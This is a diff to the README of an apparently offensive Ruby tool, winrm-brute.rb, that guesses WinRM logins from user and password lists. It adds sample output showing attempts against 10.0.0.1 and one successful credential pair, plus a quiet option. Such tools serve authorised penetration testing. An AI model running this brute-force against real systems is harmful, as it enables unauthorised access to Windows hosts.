@@ -50,6 +50,23 @@ can run:
 $bundle exec ./winrm-brute.rb -U users.txt -P passwords.txt 10.0.0.1
 ```
 
+Example output:
+```shell
+Trying admin:password
+Trying admin:P@ssw0rd
+Trying Guest:password
+Trying Guest:P@ssw0rd
+Trying DefaultAccount:password
+Trying DefaultAccount:P@ssw0rd
+Trying bob:password
+Trying bob:P@ssw0rd
+[SUCCESS] user: bob password: P@ssw0rd
+Trying john:password
+Trying john:P@ssw0rd
+```
+
+Use the `-q` option to omit the "Trying" messages.
+
 ## Dependencies
 The only dependency is [WinRM] Ruby gem.
 
